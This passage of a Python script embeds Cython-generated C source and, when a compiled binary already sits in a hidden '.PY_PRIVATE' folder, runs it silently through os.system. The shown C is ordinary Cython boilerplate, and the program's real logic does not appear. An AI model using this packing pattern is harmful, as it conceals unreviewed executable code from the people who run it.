
import os
import sys

PSH_TEAM_KEY = "بخ 👀"

EXECUTE_FILE = ".PY_PRIVATE/20240508194538616"
PREFIX = sys.prefix
EXPORT_PYTHONHOME = 'export PYTHONHOME='+PREFIX
EXPORT_PYTHON_EXECUTABLE = 'export PYTHON_EXECUTABLE='+sys.executable

RUN = "./"+EXECUTE_FILE

if os.path.isfile(EXECUTE_FILE):
    os.system(EXPORT_PYTHONHOME+" && "+EXPORT_PYTHON_EXECUTABLE+" && "+RUN)
    exit(0)

C_SOURCE = r'''#ifndef PY_SSIZE_T_CLEAN
#define PY_SSIZE_T_CLEAN
#endif /* PY_SSIZE_T_CLEAN */
#include "Python.h"
#ifndef Py_PYTHON_H
    #error Python headers needed to compile C extensions, please install development version of Python.
#elif PY_VERSION_HEX < 0x02060000 || (0x03000000 <= PY_VERSION_HEX && PY_VERSION_HEX < 0x03030000)
    #error Cython requires Python 2.6+ or Python 3.3+.
#else
#define CYTHON_ABI "0_29_33"
#define CYTHON_HEX_VERSION 0x001D21F0
#define CYTHON_FUTURE_DIVISION 1
#include <stddef.h>
#ifndef offsetof
  #define offsetof(type, member) ( (size_t) & ((type*)0) -> member )
#endif
#if !defined(WIN32) && !defined(MS_WINDOWS)
  #ifndef __stdcall
    #define __stdcall
  #endif
  #ifndef __cdecl
    #define __cdecl
  #endif
  #ifndef __fastcall
    #define __fastcall
  #endif
#endif
#ifndef DL_IMPORT
  #define DL_IMPORT(t) t
#endif
#ifndef DL_EXPORT
  #define DL_EXPORT(t) t
#endif
#define __PYX_COMMA ,
#ifndef HAVE_LONG_LONG
  #if PY_VERSION_HEX >= 0x02070000
    #define HAVE_LONG_LONG
  #endif
#endif
#ifndef PY_LONG_LONG
  #define PY_LONG_LONG LONG_LONG
#endif
#ifndef Py_HUGE_VAL
  #define Py_HUGE_VAL HUGE_VAL
#endif
#ifdef PYPY_VERSION
  #define CYTHON_COMPILING_IN_PYPY 1
  #define CYTHON_COMPILING_IN_PYSTON 0
  #define CYTHON_COMPILING_IN_CPYTHON 0
  #define CYTHON_COMPILING_IN_NOGIL 0
  #undef CYTHON_USE_TYPE_SLOTS
  #define CYTHON_USE_TYPE_SLOTS 0
  #undef CYTHON_USE_PYTYPE_LOOKUP
  #define CYTHON_USE_PYTYPE_LOOKUP 0
  #if PY_VERSION_HEX < 0x03050000
    #undef CYTHON_USE_ASYNC_SLOTS
    #define CYTHON_USE_ASYNC_SLOTS 0
  #elif !defined(CYTHON_USE_ASYNC_SLOTS)
    #define CYTHON_USE_ASYNC_SLOTS 1
  #endif
  #undef CYTHON_USE_PYLIST_INTERNALS
  #define CYTHON_USE_PYLIST_INTERNALS 0
  #undef CYTHON_USE_UNICODE_INTERNALS
  #define CYTHON_USE_UNICODE_INTERNALS 0
  #undef CYTHON_USE_UNICODE_WRITER
  #define CYTHON_USE_UNICODE_WRITER 0
  #undef CYTHON_USE_PYLONG_INTERNALS
  #define CYTHON_USE_PYLONG_INTERNALS 0
  #undef CYTHON_AVOID_BORROWED_REFS
  #define CYTHON_AVOID_BORROWED_REFS 1
  #undef CYTHON_ASSUME_SAFE_MACROS
  #define CYTHON_ASSUME_SAFE_MACROS 0
  #undef CYTHON_UNPACK_METHODS
  #define CYTHON_UNPACK_METHODS 0
  #undef CYTHON_FAST_THREAD_STATE
  #define CYTHON_FAST_THREAD_STATE 0
  #undef CYTHON_FAST_PYCALL
  #define CYTHON_FAST_PYCALL 0
  #undef CYTHON_PEP489_MULTI_PHASE_INIT
  #define CYTHON_PEP489_MULTI_PHASE_INIT 0
  #undef CYTHON_USE_TP_FINALIZE
  #define CYTHON_USE_TP_FINALIZE 0
  #undef CYTHON_USE_DICT_VERSIONS
  #define CYTHON_USE_DICT_VERSIONS 0
  #undef CYTHON_USE_EXC_INFO_STACK
  #define CYTHON_USE_EXC_INFO_STACK 0
  #ifndef CYTHON_UPDATE_DESCRIPTOR_DOC
    #define CYTHON_UPDATE_DESCRIPTOR_DOC 0
  #endif
#elif defined(PYSTON_VERSION)
  #define CYTHON_COMPILING_IN_PYPY 0
  #define CYTHON_COMPILING_IN_PYSTON 1
  #define CYTHON_COMPILING_IN_CPYTHON 0
  #define CYTHON_COMPILING_IN_NOGIL 0
  #ifndef CYTHON_USE_TYPE_SLOTS
    #define CYTHON_USE_TYPE_SLOTS 1
  #endif
  #undef CYTHON_USE_PYTYPE_LOOKUP
  #define CYTHON_USE_PYTYPE_LOOKUP 0
  #undef CYTHON_USE_ASYNC_SLOTS
  #define CYTHON_USE_ASYNC_SLOTS 0
  #undef CYTHON_USE_PYLIST_INTERNALS
  #define CYTHON_USE_PYLIST_INTERNALS 0
  #ifndef CYTHON_USE_UNICODE_INTERNALS
    #define CYTHON_USE_UNICODE_INTERNALS 1
  #endif
  #undef CYTHON_USE_UNICODE_WRITER
  #define CYTHON_USE_UNICODE_WRITER 0
  #undef CYTHON_USE_PYLONG_INTERNALS
  #define CYTHON_USE_PYLONG_INTERNALS 0
  #ifndef CYTHON_AVOID_BORROWED_REFS
    #define CYTHON_AVOID_BORROWED_REFS 0
  #endif
  #ifndef CYTHON_ASSUME_SAFE_MACROS
    #define CYTHON_ASSUME_SAFE_MACROS 1
  #endif
  #ifndef CYTHON_UNPACK_METHODS
    #define CYTHON_UNPACK_METHODS 1
  #endif
  #undef CYTHON_FAST_THREAD_STATE
  #define CYTHON_FAST_THREAD_STATE 0
  #undef CYTHON_FAST_PYCALL
  #define CYTHON_FAST_PYCALL 0
  #undef CYTHON_PEP489_MULTI_PHASE_INIT
  #define CYTHON_PEP489_MULTI_PHASE_INIT 0
  #undef CYTHON_USE_TP_FINALIZE
  #define CYTHON_USE_TP_FINALIZE 0
  #undef CYTHON_USE_DICT_VERSIONS
  #define CYTHON_USE_DICT_VERSIONS 0
  #undef CYTHON_USE_EXC_INFO_STACK
  #define CYTHON_USE_EXC_INFO_STACK 0
  #ifndef CYTHON_UPDATE_DESCRIPTOR_DOC
    #define CYTHON_UPDATE_DESCRIPTOR_DOC 0
  #endif
#elif defined(PY_NOGIL)
  #define CYTHON_COMPILING_IN_PYPY 0
  #define CYTHON_COMPILING_IN_PYSTON 0
  #define CYTHON_COMPILING_IN_CPYTHON 0
  #define CYTHON_COMPILING_IN_NOGIL 1
  #ifndef CYTHON_USE_TYPE_SLOTS
    #define CYTHON_USE_TYPE_SLOTS 1
  #endif
  #undef CYTHON_USE_PYTYPE_LOOKUP
  #define CYTHON_USE_PYTYPE_LOOKUP 0
  #ifndef CYTHON_USE_ASYNC_SLOTS
    #define CYTHON_USE_ASYNC_SLOTS 1
  #endif
  #undef CYTHON_USE_PYLIST_INTERNALS
  #define CYTHON_USE_PYLIST_INTERNALS 0
  #ifndef CYTHON_USE_UNICODE_INTERNALS
    #define CYTHON_USE_UNICODE_INTERNALS 1
  #endif
  #undef CYTHON_USE_UNICODE_WRITER
  #define CYTHON_USE_UNICODE_WRITER 0
  #undef CYTHON_USE_PYLONG_INTERNALS
  #define CYTHON_USE_PYLONG_INTERNALS 0
  #ifndef CYTHON_AVOID_BORROWED_REFS
    #define CYTHON_AVOID_BORROWED_REFS 0
  #endif
  #ifndef CYTHON_ASSUME_SAFE_MACROS
    #define CYTHON_ASSUME_SAFE_MACROS 1
  #endif
  #ifndef CYTHON_UNPACK_METHODS
    #define CYTHON_UNPACK_METHODS 1
  #endif
  #undef CYTHON_FAST_THREAD_STATE
  #define CYTHON_FAST_THREAD_STATE 0
  #undef CYTHON_FAST_PYCALL
  #define CYTHON_FAST_PYCALL 0
  #ifndef CYTHON_PEP489_MULTI_PHASE_INIT
    #define CYTHON_PEP489_MULTI_PHASE_INIT 1
  #endif
  #ifndef CYTHON_USE_TP_FINALIZE
    #define CYTHON_USE_TP_FINALIZE 1
  #endif
  #undef CYTHON_USE_DICT_VERSIONS
  #define CYTHON_USE_DICT_VERSIONS 0
  #undef CYTHON_USE_EXC_INFO_STACK
  #define CYTHON_USE_EXC_INFO_STACK 0
#else
  #define CYTHON_COMPILING_IN_PYPY 0
  #define CYTHON_COMPILING_IN_PYSTON 0
  #define CYTHON_COMPILING_IN_CPYTHON 1
  #define CYTHON_COMPILING_IN_NOGIL 0
  #ifndef CYTHON_USE_TYPE_SLOTS
    #define CYTHON_USE_TYPE_SLOTS 1
  #endif
  #if PY_VERSION_HEX < 0x02070000
    #undef CYTHON_USE_PYTYPE_LOOKUP
    #define CYTHON_USE_PYTYPE_LOOKUP 0
  #elif !defined(CYTHON_USE_PYTYPE_LOOKUP)
    #define CYTHON_USE_PYTYPE_LOOKUP 1
  #endif
  #if PY_MAJOR_VERSION < 3
    #undef CYTHON_USE_ASYNC_SLOTS
    #define CYTHON_USE_ASYNC_SLOTS 0
  #elif !defined(CYTHON_USE_ASYNC_SLOTS)
    #define CYTHON_USE_ASYNC_SLOTS 1
  #endif
  #if PY_VERSION_HEX < 0x02070000
    #undef CYTHON_USE_PYLONG_INTERNALS
    #define CYTHON_USE_PYLONG_INTERNALS 0
  #elif !defined(CYTHON_USE_PYLONG_INTERNALS)
    #define CYTHON_USE_PYLONG_INTERNALS 1
  #endif
  #ifndef CYTHON_USE_PYLIST_INTERNALS
    #define CYTHON_USE_PYLIST_INTERNALS 1
  #endif
  #ifndef CYTHON_USE_UNICODE_INTERNALS
    #define CYTHON_USE_UNICODE_INTERNALS 1
  #endif
  #if PY_VERSION_HEX < 0x030300F0 || PY_VERSION_HEX >= 0x030B00A2
    #undef CYTHON_USE_UNICODE_WRITER
    #define CYTHON_USE_UNICODE_WRITER 0
  #elif !defined(CYTHON_USE_UNICODE_WRITER)
    #define CYTHON_USE_UNICODE_WRITER 1
  #endif
  #ifndef CYTHON_AVOID_BORROWED_REFS
    #define CYTHON_AVOID_BORROWED_REFS 0
  #endif
  #ifndef CYTHON_ASSUME_SAFE_MACROS
    #define CYTHON_ASSUME_SAFE_MACROS 1
  #endif
  #ifndef CYTHON_UNPACK_METHODS
    #define CYTHON_UNPACK_METHODS 1
  #endif
  #if PY_VERSION_HEX >= 0x030B00A4
    #undef CYTHON_FAST_THREAD_STATE
    #define CYTHON_FAST_THREAD_STATE 0
  #elif !defined(CYTHON_FAST_THREAD_STATE)
    #define CYTHON_FAST_THREAD_STATE 1
  #endif
  #ifndef CYTHON_FAST_PYCALL
    #define CYTHON_FAST_PYCALL (PY_VERSION_HEX < 0x030A0000)
  #endif
  #ifndef CYTHON_PEP489_MULTI_PHASE_INIT
    #define CYTHON_PEP489_MULTI_PHASE_INIT (PY_VERSION_HEX >= 0x03050000)
  #endif
  #ifndef CYTHON_USE_TP_FINALIZE
    #define CYTHON_USE_TP_FINALIZE (PY_VERSION_HEX >= 0x030400a1)
  #endif
  #ifndef CYTHON_USE_DICT_VERSIONS
    #define CYTHON_USE_DICT_VERSIONS (PY_VERSION_HEX >= 0x030600B1)
  #endif
  #if PY_VERSION_HEX >= 0x030B00A4
    #undef CYTHON_USE_EXC_INFO_STACK
    #define CYTHON_USE_EXC_INFO_STACK 0
  #elif !defined(CYTHON_USE_EXC_INFO_STACK)
    #define CYTHON_USE_EXC_INFO_STACK (PY_VERSION_HEX >= 0x030700A3)
  #endif
  #ifndef CYTHON_UPDATE_DESCRIPTOR_DOC
    #define CYTHON_UPDATE_DESCRIPTOR_DOC 1
  #endif
#endif
#if !defined(CYTHON_FAST_PYCCALL)
#define CYTHON_FAST_PYCCALL  (CYTHON_FAST_PYCALL && PY_VERSION_HEX >= 0x030600B1)
#endif
#if CYTHON_USE_PYLONG_INTERNALS
  #if PY_MAJOR_VERSION < 3
    #include "longintrepr.h"
  #endif
  #undef SHIFT
  #undef BASE
  #undef MASK
  #ifdef SIZEOF_VOID_P
    enum { __pyx_check_sizeof_voidp = 1 / (int)(SIZEOF_VOID_P == sizeof(void*)) };
  #endif
#endif
#ifndef __has_attribute
  #define __has_attribute(x) 0
#endif
#ifndef __has_cpp_attribute
  #define __has_cpp_attribute(x) 0
#endif
#ifndef CYTHON_RESTRICT
  #if defined(__GNUC__)
    #define CYTHON_RESTRICT __restrict__
  #elif defined(_MSC_VER) && _MSC_VER >= 1400
    #define CYTHON_RESTRICT __restrict
  #elif defined (__STDC_VERSION__) && __STDC_VERSION__ >= 199901L
    #define CYTHON_RESTRICT restrict
  #else
    #define CYTHON_RESTRICT
  #endif
#endif
#ifndef CYTHON_UNUSED
# if defined(__GNUC__)
#   if !(defined(__cplusplus)) || (__GNUC__ > 3 || (__GNUC__ == 3 && __GNUC_MINOR__ >= 4))
#     define CYTHON_UNUSED __attribute__ ((__unused__))
#   else
#     define CYTHON_UNUSED
#   endif
# elif defined(__ICC) || (defined(__INTEL_COMPILER) && !defined(_MSC_VER))
#   define CYTHON_UNUSED __attribute__ ((__unused__))
# else
#   define CYTHON_UNUSED
# endif
#endif
#ifndef CYTHON_MAYBE_UNUSED_VAR
#  if defined(__cplusplus)
     template<class T> void CYTHON_MAYBE_UNUSED_VAR( const T& ) { }
#  else
#    define CYTHON_MAYBE_UNUSED_VAR(x) (void)(x)
#  endif
#endif
#ifndef CYTHON_NCP_UNUSED
# if CYTHON_COMPILING_IN_CPYTHON
#  define CYTHON_NCP_UNUSED
# else
#  define CYTHON_NCP_UNUSED CYTHON_UNUSED
# endif
#endif
#define __Pyx_void_to_None(void_result) ((void)(void_result), Py_INCREF(Py_None), Py_None)
#ifdef _MSC_VER
    #ifndef _MSC_STDINT_H_
        #if _MSC_VER < 1300
           typedef unsigned char     uint8_t;
           typedef unsigned int      uint32_t;
        #else
           typedef unsigned __int8   uint8_t;
           typedef unsigned __int32  uint32_t;
        #endif
    #endif
#else
   #include <stdint.h>
#endif
#ifndef CYTHON_FALLTHROUGH
  #if defined(__cplusplus) && __cplusplus >= 201103L
    #if __has_cpp_attribute(fallthrough)
      #define CYTHON_FALLTHROUGH [[fallthrough]]
    #elif __has_cpp_attribute(clang::fallthrough)
      #define CYTHON_FALLTHROUGH [[clang::fallthrough]]
    #elif __has_cpp_attribute(gnu::fallthrough)
      #define CYTHON_FALLTHROUGH [[gnu::fallthrough]]
    #endif
  #endif
  #ifndef CYTHON_FALLTHROUGH
    #if __has_attribute(fallthrough)
      #define CYTHON_FALLTHROUGH __attribute__((fallthrough))
    #else
      #define CYTHON_FALLTHROUGH
    #endif
  #endif
  #if defined(__clang__ ) && defined(__apple_build_version__)
    #if __apple_build_version__ < 7000000
      #undef  CYTHON_FALLTHROUGH
      #define CYTHON_FALLTHROUGH
    #endif
  #endif
#endif

#ifndef CYTHON_INLINE
  #if defined(__clang__)
    #define CYTHON_INLINE __inline__ __attribute__ ((__unused__))
  #elif defined(__GNUC__)
    #define CYTHON_INLINE __inline__
  #elif defined(_MSC_VER)
    #define CYTHON_INLINE __inline
  #elif defined (__STDC_VERSION__) && __STDC_VERSION__ >= 199901L
    #define CYTHON_INLINE inline
  #else
    #define CYTHON_INLINE
  #endif
#endif

#if CYTHON_COMPILING_IN_PYPY && PY_VERSION_HEX < 0x02070600 && !defined(Py_OptimizeFlag)
  #define Py_OptimizeFlag 0
#endif
#define __PYX_BUILD_PY_SSIZE_T "n"
#define CYTHON_FORMAT_SSIZE_T "z"
#if PY_MAJOR_VERSION < 3
  #define __Pyx_BUILTIN_MODULE_NAME "__builtin__"
  #define __Pyx_PyCode_New(a, k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)\
          PyCode_New(a+k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)
  #define __Pyx_DefaultClassType PyClass_Type
#else
  #define __Pyx_BUILTIN_MODULE_NAME "builtins"
  #define __Pyx_DefaultClassType PyType_Type
#if PY_VERSION_HEX >= 0x030B00A1
    static CYTHON_INLINE PyCodeObject* __Pyx_PyCode_New(int a, int k, int l, int s, int f,
                                                    PyObject *code, PyObject *c, PyObject* n, PyObject *v,
                                                    PyObject *fv, PyObject *cell, PyObject* fn,
                                                    PyObject *name, int fline, PyObject *lnos) {
        PyObject *kwds=NULL, *argcount=NULL, *posonlyargcount=NULL, *kwonlyargcount=NULL;
        PyObject *nlocals=NULL, *stacksize=NULL, *flags=NULL, *replace=NULL, *call_result=NULL, *empty=NULL;
        const char *fn_cstr=NULL;
        const char *name_cstr=NULL;
        PyCodeObject* co=NULL;
        PyObject *type, *value, *traceback;
        PyErr_Fetch(&type, &value, &traceback);
        if (!(kwds=PyDict_New())) goto end;
        if (!(argcount=PyLong_FromLong(a))) goto end;
        if (PyDict_SetItemString(kwds, "co_argcount", argcount) != 0) goto end;
        if (!(posonlyargcount=PyLong_FromLong(0))) goto end;
        if (PyDict_SetItemString(kwds, "co_posonlyargcount", posonlyargcount) != 0) goto end;
        if (!(kwonlyargcount=PyLong_FromLong(k))) goto end;
        if (PyDict_SetItemString(kwds, "co_kwonlyargcount", kwonlyargcount) != 0) goto end;
        if (!(nlocals=PyLong_FromLong(l))) goto end;
        if (PyDict_SetItemString(kwds, "co_nlocals", nlocals) != 0) goto end;
        if (!(stacksize=PyLong_FromLong(s))) goto end;
        if (PyDict_SetItemString(kwds, "co_stacksize", stacksize) != 0) goto end;
        if (!(flags=PyLong_FromLong(f))) goto end;
        if (PyDict_SetItemString(kwds, "co_flags", flags) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_code", code) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_consts", c) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_names", n) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_varnames", v) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_freevars", fv) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_cellvars", cell) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_linetable", lnos) != 0) goto end;
        if (!(fn_cstr=PyUnicode_AsUTF8AndSize(fn, NULL))) goto end;
        if (!(name_cstr=PyUnicode_AsUTF8AndSize(name, NULL))) goto end;
        if (!(co = PyCode_NewEmpty(fn_cstr, name_cstr, fline))) goto end;
        if (!(replace = PyObject_GetAttrString((PyObject*)co, "replace"))) goto cleanup_code_too;
        if (!(empty = PyTuple_New(0))) goto cleanup_code_too; // unfortunately __pyx_empty_tuple isn't available here
        if (!(call_result = PyObject_Call(replace, empty, kwds))) goto cleanup_code_too;
        Py_XDECREF((PyObject*)co);
        co = (PyCodeObject*)call_result;
        call_result = NULL;
        if (0) {
            cleanup_code_too:
            Py_XDECREF((PyObject*)co);
            co = NULL;
        }
        end:
        Py_XDECREF(kwds);
        Py_XDECREF(argcount);
        Py_XDECREF(posonlyargcount);
        Py_XDECREF(kwonlyargcount);
        Py_XDECREF(nlocals);
        Py_XDECREF(stacksize);
        Py_XDECREF(replace);
        Py_XDECREF(call_result);
        Py_XDECREF(empty);
        if (type) {
            PyErr_Restore(type, value, traceback);
        }
        return co;
    }
#else
  #define __Pyx_PyCode_New(a, k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)\
          PyCode_New(a, k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)
#endif
  #define __Pyx_DefaultClassType PyType_Type
#endif
#ifndef Py_TPFLAGS_CHECKTYPES
  #define Py_TPFLAGS_CHECKTYPES 0
#endif
#ifndef Py_TPFLAGS_HAVE_INDEX
  #define Py_TPFLAGS_HAVE_INDEX 0
#endif
#ifndef Py_TPFLAGS_HAVE_NEWBUFFER
  #define Py_TPFLAGS_HAVE_NEWBUFFER 0
#endif
#ifndef Py_TPFLAGS_HAVE_FINALIZE
  #define Py_TPFLAGS_HAVE_FINALIZE 0
#endif
#ifndef METH_STACKLESS
  #define METH_STACKLESS 0
#endif
#if PY_VERSION_HEX <= 0x030700A3 || !defined(METH_FASTCALL)
  #ifndef METH_FASTCALL
     #define METH_FASTCALL 0x80
  #endif
  typedef PyObject *(*__Pyx_PyCFunctionFast) (PyObject *self, PyObject *const *args, Py_ssize_t nargs);
  typedef PyObject *(*__Pyx_PyCFunctionFastWithKeywords) (PyObject *self, PyObject *const *args,
                                                          Py_ssize_t nargs, PyObject *kwnames);
#else
  #define __Pyx_PyCFunctionFast _PyCFunctionFast
  #define __Pyx_PyCFunctionFastWithKeywords _PyCFunctionFastWithKeywords
#endif
#if CYTHON_FAST_PYCCALL
#define __Pyx_PyFastCFunction_Check(func)\
    ((PyCFunction_Check(func) && (METH_FASTCALL == (PyCFunction_GET_FLAGS(func) & ~(METH_CLASS | METH_STATIC | METH_COEXIST | METH_KEYWORDS | METH_STACKLESS)))))
#else
#define __Pyx_PyFastCFunction_Check(func) 0
#endif
#if CYTHON_COMPILING_IN_PYPY && !defined(PyObject_Malloc)
  #define PyObject_Malloc(s)   PyMem_Malloc(s)
  #define PyObject_Free(p)     PyMem_Free(p)
  #define PyObject_Realloc(p)  PyMem_Realloc(p)
#endif
#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX < 0x030400A1
  #define PyMem_RawMalloc(n)           PyMem_Malloc(n)
  #define PyMem_RawRealloc(p, n)       PyMem_Realloc(p, n)
  #define PyMem_RawFree(p)             PyMem_Free(p)
#endif
#if CYTHON_COMPILING_IN_PYSTON
  #define __Pyx_PyCode_HasFreeVars(co)  PyCode_HasFreeVars(co)
  #define __Pyx_PyFrame_SetLineNumber(frame, lineno) PyFrame_SetLineNumber(frame, lineno)
#else
  #define __Pyx_PyCode_HasFreeVars(co)  (PyCode_GetNumFree(co) > 0)
  #define __Pyx_PyFrame_SetLineNumber(frame, lineno)  (frame)->f_lineno = (lineno)
#endif
#if !CYTHON_FAST_THREAD_STATE || PY_VERSION_HEX < 0x02070000
  #define __Pyx_PyThreadState_Current PyThreadState_GET()
#elif PY_VERSION_HEX >= 0x03060000
  #define __Pyx_PyThreadState_Current _PyThreadState_UncheckedGet()
#elif PY_VERSION_HEX >= 0x03000000
  #define __Pyx_PyThreadState_Current PyThreadState_GET()
#else
  #define __Pyx_PyThreadState_Current _PyThreadState_Current
#endif
#if PY_VERSION_HEX < 0x030700A2 && !defined(PyThread_tss_create) && !defined(Py_tss_NEEDS_INIT)
#include "pythread.h"
#define Py_tss_NEEDS_INIT 0
typedef int Py_tss_t;
static CYTHON_INLINE int PyThread_tss_create(Py_tss_t *key) {
  *key = PyThread_create_key();
  return 0;
}
static CYTHON_INLINE Py_tss_t * PyThread_tss_alloc(void) {
  Py_tss_t *key = (Py_tss_t *)PyObject_Malloc(sizeof(Py_tss_t));
  *key = Py_tss_NEEDS_INIT;
  return key;
}
static CYTHON_INLINE void PyThread_tss_free(Py_tss_t *key) {
  PyObject_Free(key);
}
static CYTHON_INLINE int PyThread_tss_is_created(Py_tss_t *key) {
  return *key != Py_tss_NEEDS_INIT;
}
static CYTHON_INLINE void PyThread_tss_delete(Py_tss_t *key) {
  PyThread_delete_key(*key);
  *key = Py_tss_NEEDS_INIT;
}
static CYTHON_INLINE int PyThread_tss_set(Py_tss_t *key, void *value) {
  return PyThread_set_key_value(*key, value);
}
static CYTHON_INLINE void * PyThread_tss_get(Py_tss_t *key) {
  return PyThread_get_key_value(*key);
}
#endif
#if CYTHON_COMPILING_IN_CPYTHON || defined(_PyDict_NewPresized)
#define __Pyx_PyDict_NewPresized(n)  ((n <= 8) ? PyDict_New() : _PyDict_NewPresized(n))
#else
#define __Pyx_PyDict_NewPresized(n)  PyDict_New()
#endif
#if PY_MAJOR_VERSION >= 3 || CYTHON_FUTURE_DIVISION
  #define __Pyx_PyNumber_Divide(x,y)         PyNumber_TrueDivide(x,y)
  #define __Pyx_PyNumber_InPlaceDivide(x,y)  PyNumber_InPlaceTrueDivide(x,y)
#else
  #define __Pyx_PyNumber_Divide(x,y)         PyNumber_Divide(x,y)
  #define __Pyx_PyNumber_InPlaceDivide(x,y)  PyNumber_InPlaceDivide(x,y)
#endif
#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x030500A1 && CYTHON_USE_UNICODE_INTERNALS
#define __Pyx_PyDict_GetItemStr(dict, name)  _PyDict_GetItem_KnownHash(dict, name, ((PyASCIIObject *) name)->hash)
#else
#define __Pyx_PyDict_GetItemStr(dict, name)  PyDict_GetItem(dict, name)
#endif
#if PY_VERSION_HEX > 0x03030000 && defined(PyUnicode_KIND)
  #define CYTHON_PEP393_ENABLED 1
  #if PY_VERSION_HEX >= 0x030C0000
    #define __Pyx_PyUnicode_READY(op)       (0)
  #else
    #define __Pyx_PyUnicode_READY(op)       (likely(PyUnicode_IS_READY(op)) ?\
                                                0 : _PyUnicode_Ready((PyObject *)(op)))
  #endif
  #define __Pyx_PyUnicode_GET_LENGTH(u)   PyUnicode_GET_LENGTH(u)
  #define __Pyx_PyUnicode_READ_CHAR(u, i) PyUnicode_READ_CHAR(u, i)
  #define __Pyx_PyUnicode_MAX_CHAR_VALUE(u)   PyUnicode_MAX_CHAR_VALUE(u)
  #define __Pyx_PyUnicode_KIND(u)         PyUnicode_KIND(u)
  #define __Pyx_PyUnicode_DATA(u)         PyUnicode_DATA(u)
  #define __Pyx_PyUnicode_READ(k, d, i)   PyUnicode_READ(k, d, i)
  #define __Pyx_PyUnicode_WRITE(k, d, i, ch)  PyUnicode_WRITE(k, d, i, ch)
  #if PY_VERSION_HEX >= 0x030C0000
    #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != PyUnicode_GET_LENGTH(u))
  #else
    #if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x03090000
    #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != (likely(PyUnicode_IS_READY(u)) ? PyUnicode_GET_LENGTH(u) : ((PyCompactUnicodeObject *)(u))->wstr_length))
    #else
    #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != (likely(PyUnicode_IS_READY(u)) ? PyUnicode_GET_LENGTH(u) : PyUnicode_GET_SIZE(u)))
    #endif
  #endif
#else
  #define CYTHON_PEP393_ENABLED 0
  #define PyUnicode_1BYTE_KIND  1
  #define PyUnicode_2BYTE_KIND  2
  #define PyUnicode_4BYTE_KIND  4
  #define __Pyx_PyUnicode_READY(op)       (0)
  #define __Pyx_PyUnicode_GET_LENGTH(u)   PyUnicode_GET_SIZE(u)
  #define __Pyx_PyUnicode_READ_CHAR(u, i) ((Py_UCS4)(PyUnicode_AS_UNICODE(u)[i]))
  #define __Pyx_PyUnicode_MAX_CHAR_VALUE(u)   ((sizeof(Py_UNICODE) == 2) ? 65535 : 1114111)
  #define __Pyx_PyUnicode_KIND(u)         (sizeof(Py_UNICODE))
  #define __Pyx_PyUnicode_DATA(u)         ((void*)PyUnicode_AS_UNICODE(u))
  #define __Pyx_PyUnicode_READ(k, d, i)   ((void)(k), (Py_UCS4)(((Py_UNICODE*)d)[i]))
  #define __Pyx_PyUnicode_WRITE(k, d, i, ch)  (((void)(k)), ((Py_UNICODE*)d)[i] = ch)
  #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != PyUnicode_GET_SIZE(u))
#endif
#if CYTHON_COMPILING_IN_PYPY
  #define __Pyx_PyUnicode_Concat(a, b)      PyNumber_Add(a, b)
  #define __Pyx_PyUnicode_ConcatSafe(a, b)  PyNumber_Add(a, b)
#else
  #define __Pyx_PyUnicode_Concat(a, b)      PyUnicode_Concat(a, b)
  #define __Pyx_PyUnicode_ConcatSafe(a, b)  ((unlikely((a) == Py_None) || unlikely((b) == Py_None)) ?\
      PyNumber_Add(a, b) : __Pyx_PyUnicode_Concat(a, b))
#endif
#if CYTHON_COMPILING_IN_PYPY && !defined(PyUnicode_Contains)
  #define PyUnicode_Contains(u, s)  PySequence_Contains(u, s)
#endif
#if CYTHON_COMPILING_IN_PYPY && !defined(PyByteArray_Check)
  #define PyByteArray_Check(obj)  PyObject_TypeCheck(obj, &PyByteArray_Type)
#endif
#if CYTHON_COMPILING_IN_PYPY && !defined(PyObject_Format)
  #define PyObject_Format(obj, fmt)  PyObject_CallMethod(obj, "__format__", "O", fmt)
#endif
#define __Pyx_PyString_FormatSafe(a, b)   ((unlikely((a) == Py_None || (PyString_Check(b) && !PyString_CheckExact(b)))) ? PyNumber_Remainder(a, b) : __Pyx_PyString_Format(a, b))
#define __Pyx_PyUnicode_FormatSafe(a, b)  ((unlikely((a) == Py_None || (PyUnicode_Check(b) && !PyUnicode_CheckExact(b)))) ? PyNumber_Remainder(a, b) : PyUnicode_Format(a, b))
#if PY_MAJOR_VERSION >= 3
  #define __Pyx_PyString_Format(a, b)  PyUnicode_Format(a, b)
#else
  #define __Pyx_PyString_Format(a, b)  PyString_Format(a, b)
#endif
#if PY_MAJOR_VERSION < 3 && !defined(PyObject_ASCII)
  #define PyObject_ASCII(o)            PyObject_Repr(o)
#endif
#if PY_MAJOR_VERSION >= 3
  #define PyBaseString_Type            PyUnicode_Type
  #define PyStringObject               PyUnicodeObject
  #define PyString_Type                PyUnicode_Type
  #define PyString_Check               PyUnicode_Check
  #define PyString_CheckExact          PyUnicode_CheckExact
#ifndef PyObject_Unicode
  #define PyObject_Unicode             PyObject_Str
#endif
#endif
#if PY_MAJOR_VERSION >= 3
  #define __Pyx_PyBaseString_Check(obj) PyUnicode_Check(obj)
  #define __Pyx_PyBaseString_CheckExact(obj) PyUnicode_CheckExact(obj)
#else
  #define __Pyx_PyBaseString_Check(obj) (PyString_Check(obj) || PyUnicode_Check(obj))
  #define __Pyx_PyBaseString_CheckExact(obj) (PyString_CheckExact(obj) || PyUnicode_CheckExact(obj))
#endif
#ifndef PySet_CheckExact
  #define PySet_CheckExact(obj)        (Py_TYPE(obj) == &PySet_Type)
#endif
#if PY_VERSION_HEX >= 0x030900A4
  #define __Pyx_SET_REFCNT(obj, refcnt) Py_SET_REFCNT(obj, refcnt)
  #define __Pyx_SET_SIZE(obj, size) Py_SET_SIZE(obj, size)
#else
  #define __Pyx_SET_REFCNT(obj, refcnt) Py_REFCNT(obj) = (refcnt)
